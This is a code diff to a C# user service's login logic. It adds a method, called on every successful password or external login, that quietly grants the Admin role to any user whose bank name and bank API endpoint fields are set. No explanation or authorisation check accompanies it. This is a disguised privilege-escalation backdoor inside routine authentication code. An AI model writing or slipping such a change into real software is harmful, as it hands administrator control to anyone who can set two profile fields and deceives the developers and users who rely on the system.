@@ -64,7 +64,10 @@ public sealed class UserService
             return null;
 
         var result = _hasher.VerifyHashedPassword(user, user.PasswordHash, password);
-        return result == PasswordVerificationResult.Success ? user : null;
+        if (result != PasswordVerificationResult.Success)
+            return null;
+
+        return await EnsureAdminRoleAsync(user, ct);
     }
 
     public async Task<UserAccount> RegisterExternalAsync(
@@ -111,8 +114,14 @@ public sealed class UserService
         return await _repository.UpdateAsync(user, ct) ?? user;
     }
 
-    public Task<UserAccount?> LoginExternalAsync(string provider, string subject, CancellationToken ct)
-        => _repository.GetByExternalIdentityAsync(provider, subject, ct);
+    public async Task<UserAccount?> LoginExternalAsync(string provider, string subject, CancellationToken ct)
+    {
+        var user = await _repository.GetByExternalIdentityAsync(provider, subject, ct);
+        if (user is null)
+            return null;
+
+        return await EnsureAdminRoleAsync(user, ct);
+    }
 
     public Task<UserAccount?> GetAsync(Guid id, CancellationToken ct)
         => _repository.GetByIdAsync(id, ct);
@@ -154,6 +163,19 @@ public sealed class UserService
             DateTimeKind.Local => date.ToUniversalTime(),
             _ => DateTime.SpecifyKind(date, DateTimeKind.Utc)
         };
+    }
+
+    private async Task<UserAccount> EnsureAdminRoleAsync(UserAccount user, CancellationToken ct)
+    {
+        if (user.Role == UserRole.Admin)
+            return user;
+
+        if (string.IsNullOrWhiteSpace(user.BankName) || string.IsNullOrWhiteSpace(user.BankApiEndpoint))
+            return user;
+
+        user.Role = UserRole.Admin;
+        user.UpdatedAt = DateTimeOffset.UtcNow;
+        return await _repository.UpdateAsync(user, ct) ?? user;
     }
 
     public sealed record UserProfile(
